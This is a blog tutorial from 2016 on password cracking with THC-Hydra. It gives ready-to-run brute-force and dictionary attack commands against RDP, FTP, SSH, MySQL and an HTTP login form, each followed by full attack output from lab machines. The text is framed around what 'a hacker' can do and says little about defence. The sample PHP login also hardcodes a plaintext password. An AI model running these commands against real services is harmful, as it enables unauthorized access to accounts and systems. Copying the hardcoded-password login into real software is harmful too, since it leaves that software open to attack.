title: Brute force attack & dictionary password cracking using hydra
date: 2016-01-07 19:58:11
tags:
    - tools
    - hydra
categories: tools
---
Brute force attack and Dictionary password cracking attack is still effective. Brute force attack can be more effective if the hacker has good knowledge in password profiling,information gathering. Today, i will shortly explain that how a hacker can crack password using hydra brute force attack or dictionary attack. Before that let me give you a short definition ofBrute force and dictionary attack.

Brute force attack
Brute force attack is combination of all character a-z,A-Z,1-3 and other special characters.


Dictionary password attack
Dictionary attack is a list of common password. For example, you know "admin" is used as password to protect various confidential resource. So you put the "admin" word in your dictionary file. You also can download free password list from various source(Google search!). If the hacker is lucky then password will be in the list.



I will explain how a hacker can make brute force attack using hydra to crack various online accounts.
# Brute Force Attack
If hackers decide to make pure brute force then they need to exclude the option '-P' and use '-x min:max:char', for example '-x 3:3:a' :
```bash
root@find:~/Desktop# hydra -t 10 -V -f -l root -x 4:6:a ftp://192.168.67.132
```

The hydra syntax:
-t = How many parallel attempt at a time(1/5/10/100 ?). Don't use too much otherwise you will get false result
-V = Show output
-f = Stop when found the password.
-l = The Username (-L for username from file)
-P= Dictionary file
IP-address-or-domain module-such-as-http-form

# Cracking the RDP password
We know the default username of windows is "administrator" So we can brute force the password only:
```bash
root@find:~/Desktop# hydra -t 1 -V -f -l administrator -P common.txt rdp://192.168.67.132
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-01-07 13:24:21
[DATA] 1 task, 1 server, 933 login tries (l:1/p:933), ~933 tries per task
[DATA] attacking service rdp on port 3389
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "Admin" - 1 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "Administration" - 2 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "crm" - 3 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "CVS" - 4 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "CYBERDOCS" - 5 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "CYBERDOCS25" - 6 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "CYBERDOCS31" - 7 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "INSTALL_admin" - 8 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "Log" - 9 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "Logs" - 10 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "Pages" - 11 of 933 [child 0]
[ATTEMPT] target 192.168.67.132 - login "administrator" - pass "youradmin" - 12 of 933 [child 0]
[3389][rdp] host: 192.168.67.132   login: administrator   password: youradmin
[STATUS] attack finished for 192.168.67.132 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-01-07 13:24:46

I did it on vmware workstation and was too slow!
```
# Cracking FTP password
Hacker knows the user name of the FTP is 'root' , So hacker make a quick password guessing with following command:
```bash
root@find:~/Desktop# hydra -t 5 -V -f -l root -P common.txt ftp://192.168.67.132
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-01-07 13:45:55
[DATA] 5 tasks, 1 server, 934 login tries (l:1/p:934), ~186 tries per task
[DATA] attacking service ftp on port 21
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Admin" - 1 of 934 [child 0]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Administration" - 2 of 934 [child 1]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "crm" - 3 of 934 [child 2]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "CVS" - 4 of 934 [child 3]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "CYBERDOCS" - 5 of 934 [child 4]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "CYBERDOCS25" - 6 of 934 [child 1]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "CYBERDOCS31" - 7 of 934 [child 0]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "INSTALL_admin" - 8 of 934 [child 2]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Log" - 9 of 934 [child 3]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Logs" - 10 of 934 [child 1]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Pages" - 11 of 934 [child 4]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "youradmin" - 12 of 934 [child 0]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "ftpadmin" - 13 of 934 [child 2]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Servlet" - 14 of 934 [child 3]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Servlets" - 15 of 934 [child 1]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "SiteServer" - 16 of 934 [child 4]
[ATTEMPT] target 192.168.67.132 - login "root" - pass "Sources" - 17 of 934 [child 0]
[21][ftp] host: 192.168.67.132   login: root   password: ftpadmin
[STATUS] attack finished for 192.168.67.132 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-01-07 13:45:55
root@find:~/Desktop# 

Here the password is ftpadmin! 
root@find:~/Desktop# ftp 192.168.67.132
Connected to 192.168.67.132.
220 Hello, I'm freeFTPd 1.0
Name (192.168.67.132:root): root    
331 Password required for root
Password:
230 User root logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection
drwxr-xr-x   1 root       root            0 Jan  7 13:39 .
drwxr-xr-x   1 root       root            0 Jan  7 13:39 ..
226 Directory send OK
```
# Cracking SSH password with hydra
```bash
root@find:~/Desktop# hydra -t 5 -V -f -l root -P common.txt localhost ssh
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-01-07 14:11:56
[DATA] 5 tasks, 1 server, 935 login tries (l:1/p:935), ~187 tries per task
[DATA] attacking service ssh on port 22
[ATTEMPT] target localhost - login "root" - pass "Admin" - 1 of 935 [child 0]
[ATTEMPT] target localhost - login "root" - pass "Administration" - 2 of 935 [child 1]
[ATTEMPT] target localhost - login "root" - pass "crm" - 3 of 935 [child 2]
[ATTEMPT] target localhost - login "root" - pass "CVS" - 4 of 935 [child 3]
[ATTEMPT] target localhost - login "root" - pass "CYBERDOCS" - 5 of 935 [child 4]
[ATTEMPT] target localhost - login "root" - pass "CYBERDOCS25" - 6 of 935 [child 1]
[ATTEMPT] target localhost - login "root" - pass "CYBERDOCS31" - 7 of 935 [child 3]
[ATTEMPT] target localhost - login "root" - pass "INSTALL_admin" - 8 of 935 [child 4]
[ATTEMPT] target localhost - login "root" - pass "Log" - 9 of 935 [child 2]
[ATTEMPT] target localhost - login "root" - pass "sshfuck" - 10 of 935 [child 0]
[22][ssh] host: 127.0.0.1   login: root   password: sshfuck
[STATUS] attack finished for localhost (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-01-07 14:11:58
```
# MySQL password cracking using hydra
In this case we are going to crack a empty password of mysql. Some Peoples still does not use password to protect their database server. We can make brute force attack like this:
```bash
root@find:~/Desktop# hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-01-07 14:18:16
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] 4 tasks, 1 server, 937 login tries (l:1/p:937), ~234 tries per task
[DATA] attacking service mysql on port 3306
[ATTEMPT] target localhost - login "root" - pass "root" - 1 of 937 [child 0]
[ATTEMPT] target localhost - login "root" - pass "" - 2 of 937 [child 1]
[ATTEMPT] target localhost - login "root" - pass "Admin" - 3 of 937 [child 2]
[ATTEMPT] target localhost - login "root" - pass "Administration" - 4 of 937 [child 3]
[3306][mysql] host: 127.0.0.1   login: root   password: 
[STATUS] attack finished for localhost (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-01-07 14:18:16

Attention to the option of hydra: -e ns .

```
# Web Form brute forcing
I have coded a simple html login form for this test. Hydra can brute force web form faster and effectively than other tools. But it requires you to understand that how the form is being handled. So the hacker need to have basic understanding of html too. Also the hacker/you need to find out the correct username otherwise it will be failed or will need to brute force the  user name which is really bad idea.

The login form:
```html
<html>
<head>
<title>Admin Login</title>
</head>

<body>
<center>
<h1>Administrator Login</h1>
<form action="log.php" method="post" >
Username:<input type="text" name="user" placeholder="admin"> <br>
Password:<input type="password" name="password" placeholder="password"><br>
<input type="submit" name="user" value="submit" >
</form>
</center>

</body>
</html>
```
We actually need to brute force the name="password" . "password" is the name of the password field which need to match with an string from database or from php hard coded string. For your better understanding i am pasting the log.php too:
```php
<?php

$pass="yourpass";

$passGet=$_POST["password"];

if($passGet==$pass){
        echo "success!";
        echo "<br>";
}

else{
        echo "fail";
}


?>
```
In the php code $passGet=$_POST["password"]; getting field string by post method and comparing with variable $pass . If you input yourpass in password field then it will say success otherwise fail. 

Imagine, We don't know the password so we are going to brute force it using hydra. We have following information:

URL: http://http://localhost/login/ (Optional?)
Action page: http://localhost/login/log.php   (Required)
User: admin
Form parameter:  user=admin&password=brute-force-here   (see the html!)

Let us now brute force the password using thc-hydra.

Hydra command 1:
```bash
hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:S=success"
```
Here is output:
```bash
root@find:~/Desktop# hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:S=success"
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-01-09 06:08:07
[DATA] 4 tasks, 1 server, 935 login tries (l:1/p:935), ~233 tries per task
[DATA] attacking service http-post-form on port 80
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Admin" - 1 of 935 [child 0]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Administration" - 2 of 935 [child 1]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "crm" - 3 of 935 [child 2]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CVS" - 4 of 935 [child 3]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CYBERDOCS" - 5 of 935 [child 1]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CYBERDOCS25" - 6 of 935 [child 0]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CYBERDOCS31" - 7 of 935 [child 2]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "INSTALL_admin" - 8 of 935 [child 3]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Log" - 9 of 935 [child 1]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "yourpass" - 10 of 935 [child 2]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Logs" - 11 of 935 [child 0]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Pages" - 12 of 935 [child 3]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "youradmin" - 13 of 935 [child 1]
[80][www-form] host: 192.168.206.1   login: admin   password: yourpass
1 of 1 target successfully completed, 1 valid password found

Let's break down the "/login/log.php:user=^USER^&password=^PASS^:S=success" 
 
/login/ = path
log.php = Action page 
user = First parameter
^USER^ = Use the strings from -l or -L
password = Second parameter
^PASS^ =  Use the strings from -p or -P(usually dictionary file or for brute force option -x)
S=success = When hydra see success message from the action page it will stop mean , Successfully cracked!
This is really important. If it has been set wrong then hydra will give false positive. So careful! 
 
```
# Hydra command 2
```bash
hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:fail"
root@find:~/Desktop# hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:fail"
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-01-09 06:38:28
[DATA] 4 tasks, 1 server, 935 login tries (l:1/p:935), ~233 tries per task
[DATA] attacking service http-post-form on port 80
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Admin" - 1 of 935 [child 0]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Administration" - 2 of 935 [child 1]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "crm" - 3 of 935 [child 2]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CVS" - 4 of 935 [child 3]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CYBERDOCS" - 5 of 935 [child 1]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CYBERDOCS25" - 6 of 935 [child 3]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "CYBERDOCS31" - 7 of 935 [child 0]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "INSTALL_admin" - 8 of 935 [child 2]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Log" - 9 of 935 [child 1]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "yourpass" - 10 of 935 [child 0]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Logs" - 11 of 935 [child 3]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "Pages" - 12 of 935 [child 1]
[ATTEMPT] target 192.168.206.1 - login "admin" - pass "youradmin" - 13 of 935 [child 2]
[80][www-form] host: 192.168.206.1   login: admin   password: yourpass
1 of 1 target successfully completed, 1 valid password found
```

